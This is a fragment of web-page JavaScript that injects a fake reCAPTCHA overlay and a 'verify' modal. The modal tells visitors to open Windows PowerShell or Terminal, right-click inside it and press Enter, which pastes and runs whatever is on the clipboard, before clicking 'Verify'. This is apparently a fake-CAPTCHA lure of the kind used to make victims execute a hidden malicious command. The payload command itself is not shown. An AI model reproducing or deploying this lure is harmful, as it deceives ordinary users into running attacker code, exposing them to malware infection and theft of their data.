(function() {
  ...
  if (window.__captchaLoaded) return;
  window.__captchaLoaded = true;
  ...
  container.innerHTML = `
    ...
    <div class="captcha-overlay" id="recaptchaModal">
      <div class="rc-wrap">
        <div class="rc-box">
          <div class="rc-left">
    ...
    <div class="captcha-overlay verify-modal" id="verifyModal">
      <div class="captcha-box">
        ...
        <div class="content">
          <ol>
            <li>Press <strong>Win ⊞ + X</strong> then select <strong>Windows PowerShell or Terminal</strong></li>
            <li>Right-click inside the open window, then press <strong>Enter</strong></li>
          </ol>
          <div class="after-text">After completing all steps click <b>"Verify"</b></div>
        </div>
        <div class="footer">
          <div class="icons">
